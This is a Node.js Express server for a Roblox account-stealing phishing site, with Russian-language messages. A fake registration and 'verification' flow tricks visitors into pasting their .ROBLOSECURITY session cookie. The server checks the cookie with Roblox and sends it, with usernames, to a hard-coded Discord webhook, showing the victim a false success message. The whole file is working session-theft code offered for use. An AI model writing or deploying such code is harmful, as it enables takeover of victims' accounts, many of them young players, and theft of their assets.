const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1398094419479236678/ojsXwWvL1So9PmkLqn7ohGRO_v67C_Noocusql2K1F-0syGtmv1_46r3vuuPU-UeZvd6";

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (_, res) => res.sendFile(path.join(__dirname, "/views/register.html")));
app.get("/verify", (_, res) => res.sendFile(path.join(__dirname, "/views/verify.html")));

app.post("/register", (req, res) => {
  const { username, email, password } = req.body;
  res.redirect(`/verify?username=${encodeURIComponent(username)}`);
});

app.post("/verify-cookie", async (req, res) => {
  const { cookie, username } = req.body;

  try {
    const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });

    if (!response.ok) throw new Error("Invalid cookie");

    const data = await response.json();

    // Отправка в Discord
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title: "✅ Новый пользователь подтвердил аккаунт!",
            fields: [
              { name: "Имя", value: username, inline: true },
              { name: "ROBLOX", value: data.UserName, inline: true },
              { name: "Cookie", value: `\`${cookie}\`` },
            ],
            color: 65280,
          },
        ],
      }),
    });

    res.send(`<script>
      document.body.innerHTML = '<div class="popup success">✅ Подтверждение прошло успешно!</div>';
      setTimeout(() => window.location.href = "/", 3000);
    </script>`);
  } catch {
    res.send(`<script>
      document.body.innerHTML = '<div class="popup error">❌ Неверные куки! Попробуйте снова.</div>';
      setTimeout(() => window.location.href = "/verify?username=${encodeURIComponent(username)}", 3000);
    </script>`);
  }
});

app.listen(PORT, () => {
  console.log("Сервер запущен на http://localhost:" + PORT);
});
